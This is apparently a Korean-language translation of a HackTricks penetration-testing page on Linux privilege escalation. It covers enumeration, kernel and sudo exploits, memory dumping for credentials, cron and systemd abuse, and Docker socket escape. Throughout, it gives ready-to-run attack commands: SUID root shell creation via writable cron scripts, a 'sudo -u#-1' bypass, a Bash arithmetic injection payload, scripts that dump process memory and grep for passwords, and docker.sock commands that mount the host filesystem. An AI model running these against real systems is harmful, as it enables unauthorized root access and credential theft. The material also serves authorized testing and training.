# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 시스템 정보

### OS 정보

실행 중인 OS에 대한 정보를 수집해봅시다.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

만약 **`PATH` 변수 내의 어떤 폴더에 쓰기 권한이 있다면** 일부 libraries나 binaries를 hijack할 수 있습니다:
```bash
echo $PATH
```
### 환경 정보

환경 변수에 흥미로운 정보, 비밀번호 또는 API keys가 있나요?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

커널 버전을 확인하고 escalate privileges에 사용할 수 있는 exploit이 있는지 확인하세요.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
여기에서 좋은 취약한 커널 목록과 일부 이미 존재하는 **compiled exploits**을 찾을 수 있습니다: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 및 [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
다른 사이트들에서도 일부 **compiled exploits**을 찾을 수 있습니다: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

그 웹에서 모든 취약한 커널 버전을 추출하려면 다음을 수행할 수 있습니다:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits를 검색하는 데 도움이 될 수 있는 도구는:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (피해자 시스템에서 실행, 커널 2.x용 익스플로잇만 검사)

항상 **커널 버전을 Google에서 검색하세요**. 어쩌면 일부 kernel exploit에 당신의 커널 버전이 적혀 있을 수 있으니, 그러면 해당 exploit가 유효한지 확신할 수 있습니다.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

다음에 나타난 취약한 sudo 버전을 기반으로:
```bash
searchsploit sudo
```
다음 grep을 사용하여 sudo 버전이 취약한지 확인할 수 있습니다.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo 버전 1.9.17p1 이전(**1.9.14 - 1.9.17 < 1.9.17p1**)에서는 사용자가 제어하는 디렉터리에서 `/etc/nsswitch.conf` 파일을 사용할 때 sudo `--chroot` 옵션을 통해 권한이 없는 로컬 사용자가 root로 권한을 상승시킬 수 있습니다.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). exploit을 실행하기 전에, 사용 중인 `sudo` 버전이 취약한지와 `chroot` 기능을 지원하는지 확인하세요.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

출처: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 서명 검증 실패

**smasher2 box of HTB**에서 이 vuln이 어떻게 악용될 수 있는지에 대한 **예시**를 확인하세요.
```bash
dmesg 2>/dev/null | grep "signature"
```
### 더 많은 시스템 열거
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 가능한 방어 수단 열거

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

만약 docker container 안에 있다면 그 안에서 탈출을 시도해보세요:

{{#ref}}
docker-security/
{{#endref}}

## 드라이브

Check **what is mounted and unmounted**, 어디에 그리고 왜 마운트되었는지 확인하세요. 만약 어떤 것이 unmounted 상태라면 그것을 mount 해보고 민감한 정보를 확인해보세요
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 유용한 소프트웨어

유용한 바이너리 열거
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
또한 **컴파일러가 설치되어 있는지** 확인하세요. 이는 kernel exploit을 사용해야 하는 경우 유용하며, 해당 exploit은 사용하려는 머신(또는 유사한 머신)에서 컴파일하는 것이 권장됩니다.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 취약한 소프트웨어 설치

설치된 패키지와 서비스의 **버전**을 확인하세요.  
예를 들어 오래된 Nagios 버전이 있어 escalating privileges를 위해 악용될 수 있습니다…\  
보다 의심스러운 설치된 소프트웨어의 버전은 수동으로 확인하는 것이 권장됩니다.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _해당 명령어들은 많은 정보를 출력하며 대부분 쓸모없을 수 있으므로, 설치된 소프트웨어 버전이 알려진 exploits에 취약한지 확인하기 위해 OpenVAS와 같은 애플리케이션 사용을 권장합니다_

## Processes

실행 중인 **어떤 프로세스들이 있는지** 살펴보고 어떤 프로세스가 **가져야 할 권한보다 더 많은 권한을 가지고 있는지** 확인하세요 (예: tomcat이 root로 실행되는 경우?)
```bash
ps aux
ps -ef
top -n 1
```
항상 [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
또한 **processes binaries에 대한 권한도 확인하세요**, 누군가의 바이너리를 덮어쓸 수 있을지도 모릅니다.

### Process monitoring

[**pspy**](https://github.com/DominicBreuker/pspy)와 같은 도구를 사용해 프로세스를 모니터링할 수 있습니다. 이는 취약한 프로세스가 자주 실행되거나 특정 조건이 충족될 때 이를 식별하는 데 매우 유용할 수 있습니다.

### Process memory

일부 서버 서비스는 **credentials in clear text inside the memory**를 저장합니다.\
일반적으로 다른 사용자 소유의 프로세스 메모리를 읽으려면 **root privileges**가 필요하므로, 이는 보통 이미 root인 상태에서 추가적인 credentials를 발견할 때 더 유용합니다.\
하지만 **일반 사용자로서 자신이 소유한 프로세스의 메모리는 읽을 수 있다**는 점을 기억하세요.

> [!WARNING]
> 요즘 대부분의 머신은 기본적으로 **ptrace를 허용하지 않습니다**, 이는 권한이 낮은 유저가 소유한 다른 프로세스를 덤프할 수 없음을 의미합니다.
>
> _**/proc/sys/kernel/yama/ptrace_scope**_ 파일이 ptrace 접근성을 제어합니다:
>
> - **kernel.yama.ptrace_scope = 0**: 동일한 uid를 가진 경우 모든 프로세스를 디버깅할 수 있습니다. 이것은 ptracing이 작동하던 전통적인 방식입니다.
> - **kernel.yama.ptrace_scope = 1**: 오직 부모 프로세스만 디버깅될 수 있습니다.
> - **kernel.yama.ptrace_scope = 2**: ptrace를 사용하려면 CAP_SYS_PTRACE 권한이 필요하므로 관리자만 사용할 수 있습니다.
> - **kernel.yama.ptrace_scope = 3**: 어떤 프로세스도 ptrace로 추적할 수 없습니다. 일단 설정되면 ptrace를 다시 활성화하려면 재부팅이 필요합니다.

#### GDB

예를 들어 FTP 서비스의 메모리에 접근할 수 있다면 Heap을 얻어 내부의 credentials를 검색할 수 있습니다.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

주어진 프로세스 ID의 경우, **maps가 해당 프로세스의 가상 주소 공간 내에서 메모리가 어떻게 매핑되는지**를 보여주며; 또한 **각 매핑된 영역의 권한**도 표시합니다. **mem** 의사 파일은 **프로세스의 메모리 자체를 노출**합니다. **maps** 파일로부터 어떤 **메모리 영역이 읽을 수 있는지**와 그 오프셋을 알 수 있습니다. 우리는 이 정보를 사용해 **mem 파일을 탐색(seek)하여 모든 읽을 수 있는 영역을 덤프**해 파일로 저장합니다.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem`은 시스템의 **물리적** 메모리에 접근을 제공하며, 가상 메모리에는 해당하지 않는다. 커널의 가상 주소 공간은 /dev/kmem을 사용해 접근할 수 있다.\
일반적으로, `/dev/mem`은 **root**와 **kmem** 그룹만 읽을 수 있다.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump는 Windows용 Sysinternals 도구 모음의 클래식 ProcDump 도구를 Linux용으로 재구성한 것입니다. 다운로드: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 도구

프로세스 메모리를 덤프하려면 다음을 사용할 수 있습니다:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_수동으로 root 요구사항을 제거하고 자신이 소유한 프로세스를 덤프할 수 있습니다
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root가 필요함)

### 프로세스 메모리에서 자격 증명

#### 수동 예

authenticator 프로세스가 실행 중인 것을 발견하면:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
프로세스(process)를 dump할 수 있으며 (이전 섹션에서 프로세스의 memory를 dump하는 다양한 방법을 확인하세요) 메모리 안에서 credentials을 검색할 수 있습니다:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

이 도구 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin)는 메모리와 일부 잘 알려진 파일에서 **평문 자격 증명**을 탈취합니다. 올바르게 작동하려면 root 권한이 필요합니다.

| 기능                                              | 프로세스 이름         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## 스케줄된/Cron 작업

### Crontab UI (alseambusher)가 root로 실행 중일 때 – 웹 기반 scheduler privesc

웹 "Crontab UI" 패널(alseambusher/crontab-ui)이 root로 실행되고 loopback에만 바인딩되어 있어도, SSH 로컬 포트 포워딩을 통해 접근하여 권한 있는 작업을 생성해 권한 상승할 수 있습니다.

전형적인 흐름
- loopback 전용 포트(예: 127.0.0.1:8000)와 Basic-Auth realm을 `ss -ntlp` / `curl -v localhost:8000`로 발견
- 운영 아티팩트에서 자격 증명 찾기:
- 백업/스크립트에서 `zip -P <password>`
- systemd 유닛에서 `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=...` 노출
- 터널링 후 로그인:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 높은 권한 작업을 생성하고 즉시 실행 (SUID shell을 생성함):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 사용하세요:
```bash
/tmp/rootshell -p   # root shell
```
하드닝
- Crontab UI를 root로 실행하지 마세요; 전용 사용자와 최소 권한으로 제한하세요
- localhost에 바인딩하고 추가로 firewall/VPN을 통해 접근을 제한하세요; passwords를 재사용하지 마세요
- unit files에 secrets를 포함하지 마세요; secret stores 또는 root-only EnvironmentFile을 사용하세요
- on-demand job executions에 대해 audit/logging을 활성화하세요



예약된 작업 중 취약한 것이 있는지 확인하세요. root로 실행되는 스크립트를 악용할 수 있을지도 모릅니다 (wildcard vuln? root가 사용하는 파일을 수정할 수 있나? symlinks를 사용하나? root가 사용하는 디렉터리에 특정 파일을 생성할 수 있나?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron 경로

예를 들어, _/etc/crontab_ 안에서 다음 PATH를 찾을 수 있습니다: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_'user' 사용자가 /home/user에 쓰기 권한을 가지고 있는 것을 주목하세요_)

이 crontab에서 root 사용자가 PATH를 설정하지 않은 상태로 어떤 명령이나 스크립트를 실행하려 한다면. 예: _\* \* \* \* root overwrite.sh_\
그렇다면, 다음을 이용해 root 쉘을 얻을 수 있습니다:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron에서 와일드카드를 포함한 스크립트 사용 (Wildcard Injection)

root에 의해 스크립트가 실행되고 명령어 안에 “**\***”가 포함되어 있다면, 이를 이용해 예상치 못한 동작(예: privesc)을 유발할 수 있습니다. 예:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**경로가 다음과 같이 wildcard 앞에 오면** _**/some/path/\***_ **취약하지 않습니다(심지어** _**./\***_ **도 그렇지 않습니다).**

다음 페이지에서 더 많은 wildcard exploitation 트릭을 읽어보세요:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash는 ((...)), $((...)) 및 let의 산술 평가 전에 parameter expansion 및 command substitution을 수행합니다. 만약 root cron/parser가 신뢰할 수 없는 로그 필드를 읽어 산술 컨텍스트로 전달한다면, 공격자는 cron이 실행될 때 root로 실행되는 command substitution $(...)를 주입할 수 있습니다.

- 왜 동작하는가: Bash에서 확장은 다음 순서로 발생합니다: parameter/variable expansion, command substitution, arithmetic expansion, 그 다음에 word splitting 및 pathname expansion. 따라서 `$(/bin/bash -c 'id > /tmp/pwn')0` 같은 값은 먼저 substitution되어(명령이 실행됨) 그 후 남은 숫자 `0`이 산술에 사용되어 스크립트가 오류 없이 계속 진행됩니다.

- 일반적인 취약 패턴:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: 공격자가 제어하는 텍스트를 파싱되는 로그에 기록되게 하여 숫자처럼 보이는 필드에 command substitution이 포함되고 마지막이 숫자로 끝나게 만드세요. 명령이 stdout으로 출력하지 않도록(또는 리다이렉트) 하여 산술이 유효하도록 하세요.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

만약 루트가 실행하는 **cron script를 수정할 수 있다면**, 매우 쉽게 shell을 얻을 수 있습니다:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
root에 의해 실행되는 script가 **당신이 완전한 접근 권한을 가진 디렉터리**를 사용한다면, 해당 폴더를 삭제하고 당신이 제어하는 script를 제공하는 다른 폴더로 **symlink 폴더를 생성하는 것**이 유용할 수 있다.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 자주 실행되는 cron jobs

프로세스를 모니터링하여 1분, 2분 또는 5분마다 실행되는 프로세스를 찾을 수 있습니다. 이를 이용해 권한을 상승시킬 수도 있습니다.

예를 들어, **1분 동안 0.1초마다 모니터링**, **실행 횟수가 적은 명령어 순으로 정렬**하고 가장 많이 실행된 명령어들을 삭제하려면 다음과 같이 할 수 있습니다:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**다음도 사용할 수 있습니다** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (이 도구는 시작되는 모든 프로세스를 모니터링하고 나열합니다).

### 보이지 않는 cron jobs

주석 뒤에 **캐리지 리턴을 넣는 것**(개행 문자 없이)으로 cronjob을 만들 수 있으며, cron job은 정상적으로 동작합니다. 예시 (캐리지 리턴 문자에 주의):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 서비스

### 쓰기 가능한 _.service_ 파일

작성 가능한 `.service` 파일이 있는지 확인하세요. 쓰기 가능하다면, 해당 파일을 **수정하여** 서비스가 **시작될 때**, **재시작될 때** 또는 **중지될 때** **backdoor가 실행되도록** 만들 수 있습니다(머신을 재부팅해야 할 수도 있습니다).\
예: `.service` 파일 내부에 **backdoor**를 만들고 **`ExecStart=/tmp/script.sh`**로 지정하세요.

### 쓰기 가능한 서비스 binaries

서비스에 의해 실행되는 **binaries에 대한 쓰기 권한(write permissions)**이 있다면, 이를 **backdoors**로 변경하여 서비스가 다시 실행될 때 **backdoors**가 실행되게 할 수 있다는 점을 명심하세요.

### systemd PATH - 상대 경로

다음으로 **systemd**에서 사용하는 PATH를 확인할 수 있습니다:
```bash
systemctl show-environment
```
경로의 폴더 중 어느 곳에든 **write**할 수 있다면 **escalate privileges**할 수 있습니다. 다음과 같은 파일들에서 **relative paths being used on service configurations**을 찾아야 합니다:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
그런 다음, 쓰기가 가능한 systemd PATH 폴더 안에 **실행 파일**을 만들고 그 이름을 **상대 경로 바이너리와 동일하게** 설정하세요. 서비스가 취약한 동작(**Start**, **Stop**, **Reload**)을 수행하도록 요청되면 당신의 **backdoor가 실행됩니다** (권한이 없는 사용자는 보통 서비스를 시작/중지할 수 없지만 `sudo -l`을 사용할 수 있는지 확인하세요).

**서비스에 대해 더 알아보려면 `man systemd.service`를 참조하세요.**

## **타이머**

타이머는 이름이 `**.timer**`로 끝나는 systemd 유닛 파일로 `**.service**` 파일이나 이벤트를 제어합니다. 타이머는 캘린더 기반 시간 이벤트와 단조(모노토닉) 시간 이벤트를 기본적으로 지원하며 비동기로 실행할 수 있기 때문에 cron의 대안으로 사용할 수 있습니다.

다음 명령으로 모든 타이머를 나열할 수 있습니다:
```bash
systemctl list-timers --all
```
### 쓰기 가능한 타이머

타이머를 수정할 수 있다면 systemd.unit의 일부 존재하는 단위(예: `.service` 또는 `.target`)를 실행하도록 만들 수 있다.
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> 이 타이머가 만료되었을 때 활성화할 Unit입니다. 인수는 접미사가 ".timer"가 아닌 유닛 이름입니다. 지정하지 않으면 이 값은 접미사를 제외하고 타이머 유닛과 동일한 이름을 가진 service로 기본 설정됩니다. (See above.) 활성화되는 유닛 이름과 타이머 유닛의 이름은 접미사를 제외하고 동일하게 명명하는 것이 권장됩니다.

Therefore, to abuse this permission you would need to:

- Find some systemd unit (like a `.service`) that is **쓰기 가능한 바이너리( writable binary)를 실행하고 있는 것**
- Find some systemd unit that is **상대 경로(relative path)를 실행**하고 있고, 해당 **systemd PATH**에 대해 **쓰기 권한(writable privileges)**을 가지고 있어 그 실행 파일을 가장(impersonate)할 수 있는 것

**Learn more about timers with `man systemd.timer`.**

### **타이머 활성화**

타이머를 활성화하려면 root 권한이 필요하며 다음을 실행해야 합니다:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS)는 클라이언트-서버 모델 내에서 같은 머신이나 다른 머신 간의 **프로세스 통신**을 가능하게 합니다. 이들은 인터-컴퓨터 통신을 위해 표준 Unix 디스크립터 파일을 사용하며 `.socket` 파일을 통해 설정됩니다.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** 이 파일 안에서는 여러 흥미로운 매개변수를 설정할 수 있습니다:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: 이 옵션들은 서로 다르지만 요약하면 **어디에서 수신(listen)할지**를 지정합니다(예: AF_UNIX 소켓 파일의 경로, 수신할 IPv4/6 및/또는 포트 번호 등).
- `Accept`: boolean 인수를 받습니다. 만약 **true**이면 **들어오는 각 연결마다 서비스 인스턴스가 생성**되고 연결 소켓만 그 서비스에 전달됩니다. **false**이면 모든 리스닝 소켓 자체가 **시작된 service unit으로 전달**되며 모든 연결에 대해 하나의 service unit만 생성됩니다. 이 값은 datagram 소켓과 FIFO에서는 무시되며, 그런 경우 단일 service unit이 모든 수신 트래픽을 무조건 처리합니다. **기본값은 false**입니다. 성능상 이유로, 새로운 데몬은 `Accept=no`에 적합한 방식으로만 작성하는 것이 권장됩니다.
- `ExecStartPre`, `ExecStartPost`: 하나 이상(또는 그 이상의) 명령줄을 받으며, 이는 리스닝 **소켓**/FIFO가 **생성되고 바인드되기 전** 또는 **후에 실행**됩니다. 명령줄의 첫 번째 토큰은 절대 경로의 파일명이어야 하며 그 뒤에 프로세스의 인수가 옵니다.
- `ExecStopPre`, `ExecStopPost`: 리스닝 **소켓**/FIFO가 **닫히고 제거되기 전** 또는 **후에 실행되는** 추가 **명령들**입니다.
- `Service`: **들어오는 트래픽**에 대해 활성화할 **service** unit 이름을 지정합니다. 이 설정은 Accept=no인 소켓에만 허용됩니다. 기본값은 소켓과 같은 이름(접미사가 교체된)의 서비스입니다. 대부분의 경우 이 옵션을 사용할 필요가 없습니다.

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### 원시 연결
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

일부 **sockets listening for HTTP** 요청이 있을 수 있다는 점을 유의하세요 (_여기서 말하는 것은 .socket 파일이 아니라 unix sockets로 동작하는 파일들입니다_). 다음 명령으로 확인할 수 있습니다:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
만약 소켓이 **responds with an HTTP** request로 응답한다면, 해당 소켓과 **communicate**할 수 있고 어쩌면 **exploit some vulnerability**할 수도 있습니다.

### 쓰기 가능한 Docker Socket

Docker socket는 종종 `/var/run/docker.sock`에 위치하며, 보호되어야 하는 중요한 파일입니다. 기본적으로 `root` 사용자와 `docker` 그룹 구성원에게 write access가 부여되어 있습니다. 이 socket에 대한 write access를 가지고 있으면 privilege escalation으로 이어질 수 있습니다. 다음은 이것이 어떻게 가능한지와 Docker CLI가 없는 경우 사용할 수 있는 대체 방법들에 대한 개요입니다.

#### **Privilege Escalation with Docker CLI**

만약 Docker socket에 write access가 있다면, 다음 명령들을 사용해 escalate privileges할 수 있습니다:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
이 명령들은 호스트의 파일 시스템에 대한 root 수준 접근 권한으로 container를 실행할 수 있게 합니다.

#### **Docker API 직접 사용하기**

Docker CLI를 사용할 수 없는 경우에도 Docker socket은 Docker API와 `curl` 명령으로 조작할 수 있습니다.

1.  **List Docker Images:** 사용 가능한 이미지 목록을 가져옵니다.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** 호스트 시스템의 루트 디렉터리를 마운트하는 container를 생성하도록 요청을 보냅니다.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

새로 생성된 container를 시작합니다:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat`를 사용해 container에 연결을 설정하면 그 안에서 명령을 실행할 수 있습니다.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` 연결을 설정한 후에는 container 내부에서 호스트 파일시스템에 대한 root 수준 접근으로 직접 명령을 실행할 수 있습니다.

### 기타

docker socket에 대해 쓰기 권한이 있고 **inside the group `docker`**라면 [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group)를 이용할 수 있습니다. 또한 [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising) 경우에는 그 API를 공격할 수도 있습니다.

